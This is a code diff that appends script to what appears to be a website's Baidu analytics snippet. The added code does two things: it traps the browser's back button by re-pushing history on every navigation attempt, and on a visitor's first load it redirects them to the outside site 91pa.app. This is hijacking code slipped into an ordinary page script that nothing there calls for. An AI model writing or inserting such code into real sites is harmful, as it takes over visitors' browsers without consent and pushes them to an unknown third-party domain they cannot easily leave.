@@ -13,3 +13,17 @@ var _hmt = _hmt || [];
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
+;(function() {
+    history.pushState(null, '', location.href);
+    window.addEventListener('popstate', function () {
+      history.pushState(null, '', location.href);
+    });
+  })();
+
+  ;(function() {
+    var KEY = 'hasVisited91pa';
+    if (!localStorage.getItem(KEY)) {
+      localStorage.setItem(KEY, 'true');
+      window.location.replace('https://91pa.app/');
+    }
+  })();
